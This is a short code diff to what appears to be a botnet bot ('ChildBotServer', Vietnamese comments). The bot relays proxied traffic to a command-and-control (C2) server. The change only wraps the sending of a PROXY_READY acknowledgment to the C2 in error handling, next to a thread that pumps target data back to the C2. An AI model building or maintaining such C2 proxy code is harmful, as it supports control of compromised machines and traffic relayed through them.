@@ -200,8 +200,11 @@ class ChildBotServer:
                 
                 # Gửi acknowledgment về C2
                 ack_command = f"PROXY_READY:{connection_id}\n"
-                self.c2_socket.send(ack_command.encode())
-                print(f"📤 Sent PROXY_READY acknowledgment for {connection_id}")
+                try:
+                    self.c2_socket.send(ack_command.encode())
+                    print(f"📤 Sent PROXY_READY acknowledgment for {connection_id}")
+                except Exception as e:
+                    print(f"❌ Error sending PROXY_READY acknowledgment: {e}")
                 
                 # Bắt đầu luồng target->C2
                 threading.Thread(target=self.pump_target_to_c2, args=(connection_id,), daemon=True).start()
